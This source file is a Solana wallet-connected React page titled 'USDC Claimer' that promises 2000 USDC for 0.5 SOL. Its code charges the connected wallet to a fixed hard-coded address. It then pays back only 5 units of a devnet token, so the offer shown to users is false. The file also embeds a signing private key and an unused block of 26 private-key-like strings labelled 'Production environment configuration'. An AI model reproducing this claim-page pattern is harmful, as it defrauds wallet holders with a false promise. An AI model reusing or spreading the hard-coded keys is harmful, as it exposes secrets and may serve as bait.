/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "byUrj27zcYN523f54tyAvWVkkwbAtnJjbkXSoq7AybezkzAiry2kYC3D4DgjJZTfKxHWQPYzzm4qqqJ5c5pK3Po"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "53nnGF1RhzBQCvaoqwJZPyEHytBjzjrbJWc36J5fbfsjwSHkLRjzCvkes81ahvoM2YJY4HL6YPz1E91GicAuVqvR",
  "key1": "3tE8sxwV8fJb3Qny8iV792okEExLk4kVq3TZueh12gtaZf65HoEJUjPtnf3N8NWuxLGdwUjMnPL9Vcw6r1vuKqZ4",
  "key2": "uC6pD8XUvhN3Qt6r2FxRyqhgrxza6ZL6cqJkQpUuCMenqgdmmufEoGig41gCgwN1nvqq4qJa5AGTWYts7xxDb1g",
  "key3": "3dmTATGGVC1xqdjpjyC5vGC8fMNVrZ8EhzP8DWDqTm5eRgTnuQdTqzqp6mWm87tUj3qkpESdnSUpNDBWbaTvqgFb",
  "key4": "4oEwtBoHKiSJWk1zB49wXVndAkVvQKMPzfbmtjuCJhZFEoaSSXddeKh8Wo5D7cSHsY4nHYogf3oyXCip5Y8H4tFs",
  "key5": "YazGdFvmSmb22CTeSH2zN1VL4RsFeao5pw3zWskyr9YKZ45ibGqU7C5rDgYF93WbPcxx6zZbQY1fR6ebTBuzg1K",
  "key6": "4wd2qUqfNWmRCBTWxAuvjYqdT1EYDtNWCRjE5PdV2oPfUHeXqfnEzAjbPYiGX4hXAJ51RxXgmKVQDe5yuGzWYRte",
  "key7": "5nRXAWjLYCn7n5T4eRP5JndyUV2VR5V8nhVXhNsxXdyex22dEKBMikv5oe1Wwtat8QGJMVBuMNUxuVNEtVvAhBJx",
  "key8": "41zKr9DDFUTYFc8ch7PFhGRoJrNatR4nVuEhHFavVhG8xCvmP1fYrVu6XUXDy85VZ7intfW7EF6ArjuWCdpbdDQn",
  "key9": "3n89NQsTcKtoAC3fVwMg6UxHcog5G41SwiwsvdBP1fhkeKhUveztSZUPWKuYJYPX5UqrgarHxexqbVnw8jH1SVb",
  "key10": "2DNqaMAULMsifmeCaQydq1CEoAKqgs6kRgth9bXPLU7tuoenQP9BqcSVVKMa3P7zPWFRD7zfnSNHAbBJSxq4PQdQ",
  "key11": "9zAKo3PtweCRohymr5zKPc5UsZBUcTfQwLhBwDKMXa59LKZZVaWqHR4zTPcyN2BnX3fc5PboZFjqjdxj6uj2UXC",
  "key12": "h6A7idYXPi7hGFgsD9Z9f9qz6zEUa1A196iVr8gb2uEEPu6XZX5D9q65CzjbxZZhsJn1XkicpNjMqcf1KT6BkiM",
  "key13": "45LcoQP6Tbzg9fTBJimGEpzVkvE9tqLi2Gm7dsBVUDiJNVX71FoNwFwujTez5qttbFvodmM3PVcn7jDrEdCwZy3s",
  "key14": "4jvQmvHC7ytKCnc8ydywhpB1oatwP4R6EejPw9gH8uZa6qebRh8nyDXht5Vkng7yDoMuCcgugg5o94b5znf5q5Sc",
  "key15": "3rTV9sirCLcDoioaMgQH5DSQaWf53budDu4x6HcLqKXMXQK97fgMoJcjNNQt6wvLyfesmGSg88LKYHT2d9k512Zu",
  "key16": "5A8GxxLxN739aciPpHRuizK7nybfKyY3mRgKGAgyHAcRtLy4Y4WTuPXn9cC6KWV57XJjobMpd554AgXVDwyLSAWZ",
  "key17": "4hWEHmbnMLhhYiT4YjCCBP1s9dUWPwxU8ggeutJvYUMgksZigPAmA1wR62niQmu8xkNK5o65T2uQvDh4avCfu2nv",
  "key18": "2PgwaKjxkBMuzJUBno75qPsCYoJtL7ZXG87HTofHUPDgaedv4YE4s3vpZZTPcQbzQy7KYL1d7ZjKtmLkMiXjBaCu",
  "key19": "4dtNswi2ug1Hy8SebSwarCJ2c4uh1vFcTLDRofx2gPrkTUQdeLyufjaN5n4u3HSNeZXKt8wuMSbwyNFSLrG9QGfG",
  "key20": "5Pv4gmQ5avUpW9pVLBktTRPAdDEd8foeFmmk7wJfmNTg8zHiZxyWxjv9fGWXn5DFLbYM2bqjtoy9bLFY3CGnHJND",
  "key21": "5nXHHd1UJnxbBtGPW69Ap7KgJXCsVoBQQwCLUcodDUp3rSecHRGLY8rsKnrRFuankqTUn7BMZ3yFWZ6G6T9DsNYi",
  "key22": "2HGodqX11d2hJKcuyhfbRwLyWiiLMZCZz3FbAyGiujwTWsu5hizmLyuH2z16fnvbKTLT6xQJAESQ9MztZkS3nKns",
  "key23": "gEx5PYcq8n2Q9UKB3ThNYzePppaxFBXu5BT9D719pu7w7HhsJfupp49MA5JACr8puzS6x9Syy4XQB14y4skvuY8",
  "key24": "349YhCUNxUKn98bxJXLbVaQ9VgeveF9opaCZccy9y4Ay7BqH7oAGa56wFuDws5VhMfEbD1oDGvQAqcWQR9KMwKuh",
  "key25": "4tmxJHcgJ4ie5yzygzgLdpKvQfKoeDnt8RmH17hzFiT7ToRDwWKH8vuk1tRqMyKYsHWAgS3B9KpGkuTumhmKGxP5"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
